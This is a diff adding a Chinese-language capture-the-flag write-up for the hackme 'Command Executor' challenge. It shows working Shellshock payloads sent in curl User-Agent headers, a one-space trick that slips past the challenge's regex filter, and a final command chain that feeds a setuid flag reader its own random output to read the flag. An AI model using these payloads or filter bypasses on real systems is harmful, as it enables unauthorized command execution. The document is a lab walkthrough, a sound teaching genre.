@@ -1098,4 +1098,151 @@ function render() {
 ?>
 ```
 
-(To be continued)
+注意到 `env` 会返回我们发送的 header 信息，并且可以确认这是货真价实的 `env`。那么这里能不能搞点事情出来呢？
+
+Google 搜索 「env shell security bug」，可以找到 Shellshock 漏洞。作为一个极其严重、已经有很长时间的漏洞，在这里还会存在吗？
+
+在 `https://blog.cloudflare.com/inside-shellshock/` 找到了一个 payload 稍作修改:
+
+```shell
+curl -H "User-Agent: () { :; }; /bin/ls" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+```
+
+结果：
+
+```
+\(\)\s*\{\s*:;\s*\}; detected! exit now.
+```
+
+被 `waf()` 拦下来了。但是稍微改一改就可以了。
+
+```shell
+curl -H "User-Agent: () { : ; }; /bin/ls" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+```
+
+返回：
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Command Executor</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
+    <link rel="stylesheet" href="comic-neue/font.css" media="all">
+    <style>
+      nav { margin-bottom: 1rem; }
+      img { max-width: 100%; }
+    </style>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+      <a class="navbar-brand" href="index.php">Command Executor</a>
+
+      <ul class="navbar-nav">
+        <li class="nav-item">
+          <a class="nav-link" href="index.php?func=man">Man</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="index.php?func=untar">Tar Tester</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="index.php?func=cmd">Cmd Exec</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="index.php?func=ls">List files</a>
+        </li>
+      </ul>
+    </nav>
+
+    <div class="container"><h1>Command Execution</h1>
+<ul><li><a href="index.php?func=cmd&cmd=ls">ls</a></li><li><a href="index.php?func=cmd&cmd=env">env</a></li></ul>
+<form action="index.php" method="GET">
+  <input type="hidden" name="func" value="cmd">
+  <div class="input-group">
+    <input class="form-control" type="text" name="cmd" id="cmd">
+    <div class="input-group-append">
+      <input class="btn btn-primary" type="submit" value="Execute">
+    </div>
+  </div>
+</form>
+<script>cmd.focus();</script>
+<h2>$ env</h2><pre>bootstrap
+cat-flag.png
+cmd.php
+comic-neue
+index.nginx-debian.html
+index.php
+ls.php
+man.php
+untar.php
+windows-run.jpg
+</pre></div>
+  </body>
+</html>
+```
+
+成功！
+
+通过之前 `ls.php` 的漏洞可以看到根目录下有三个与 flag 有关的文件：
+
+```shell
+-r--------   1 flag root   37 Jan  9  2018 flag
+-rwsr-xr-x   1 flag root 9080 Jan 19  2018 flag-reader
+-rw-r--r--   1 root root  653 Jan  9  2018 flag-reader.c
+```
+
+看一下 `flag-reader.c`。
+
+```c
+#include <unistd.h>
+#include <syscall.h>
+#include <fcntl.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+	char buff[4096], rnd[16], val[16];
+	if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
+		write(1, "Not enough random\n", 18);
+	}
+
+	setuid(1337);
+	seteuid(1337);
+	alarm(1);
+	write(1, &rnd, sizeof(rnd));
+	read(0, &val, sizeof(val));
+
+	if(memcmp(rnd, val, sizeof(rnd)) == 0) {
+		int fd = open(argv[1], O_RDONLY);
+		if(fd > 0) {
+			int s = read(fd, buff, 1024);
+			if(s > 0) {
+				write(1, buff, s);
+			}
+			close(fd);
+		} else {
+			write(1, "Can not open file\n", 18);
+		}
+	} else {
+		write(1, "Wrong response\n", 16);
+	}
+}
+```
+
+发现要在 1 秒内把其输出的内容再输入回去。
+
+所以最终 payload 为：
+
+```shell
+curl -H "User-Agent: () { : ; }; /f*er /f*g > /tmp/fffffff_tao < /tmp/fffffff_tao" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+```
+
+然后
+
+```shell
+curl -H "User-Agent: () { : ; }; /bin/cat /tmp/fffffff_tao" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
+```
+
+PS: 其实有人直接在 `/var/tmp` 里面放了 flag，可以直接看 2333333。
+
